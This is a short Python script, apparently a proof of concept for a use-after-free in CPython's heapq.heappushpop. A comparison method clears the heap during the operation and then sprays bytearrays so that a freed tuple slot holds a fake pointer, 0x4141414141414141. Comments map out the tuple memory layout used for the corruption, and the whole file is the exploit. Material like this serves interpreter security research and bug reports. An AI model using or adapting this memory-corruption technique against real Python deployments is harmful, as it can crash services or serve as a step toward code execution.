import heapq
import sys

class Evil1:
    def __eq__(self, other):
        print('In Evil1.__eq__')
        
        # Fill tuple free list
        dummy = [(i, i) for i in range(10000)]
        del dummy
        
        # Free top
        heap.clear()
        
        # Spray bytearray of size 55 (so alloc=56, block size=56)
        # tuple GC header: 16 bytes
        # tuple ob_refcnt: 8 bytes
        # tuple ob_type: 8 bytes
        # tuple ob_size: 8 bytes
        # tuple ob_item[0]: 8 bytes
        # tuple ob_item[1]: 8 bytes (offset 48-55 in bytearray buffer)
        
        fake_pointer = (0x4141414141414141).to_bytes(8, 'little')
        # Payload size must be 55, so that 55+1=56 fits in 56-byte size class.
        # ob_item[1] starts at offset 48.
        # We supply 48 bytes of 'A', and then 7 bytes of fake_pointer.
        # The 8th byte will be the null terminator \x00.
        payload = b'A' * 48 + fake_pointer[:7]
        
        global spray
        spray = [bytearray(payload) for _ in range(1000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        print('In Evil2.__gt__')
        return True

heap = [(Evil1(), 0)]

print('Calling heappushpop...')
try:
    heapq.heappushpop(heap, (0, Evil2()))
except Exception as e:
    print('Exception:', e)
print('Done')
